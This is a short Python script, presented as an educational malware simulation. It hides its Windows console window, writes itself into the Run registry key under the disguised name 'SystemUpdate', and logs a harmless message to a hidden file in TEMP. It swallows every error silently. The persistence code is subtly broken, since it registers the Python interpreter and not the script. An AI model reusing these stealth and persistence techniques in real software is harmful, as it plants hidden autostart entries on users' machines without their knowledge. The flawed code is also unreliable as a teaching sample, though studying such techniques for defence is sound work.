# Simple Malware Simulation - FOR EDUCATION ONLY
import time
import os
import sys

def hide_window():
    """Hide console window"""
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def add_to_startup():
    """Add to Windows startup (persistence)"""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except:
        pass

def run_payload():
    """Malicious payload - logs to hidden file"""
    try:
        log_file = os.path.join(os.getenv('TEMP'), 'log.txt')
        with open(log_file, 'a') as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] Hello from malware!\n")
    except:
        pass

# Main execution
hide_window()
add_to_startup()
run_payload()
time.sleep(1)
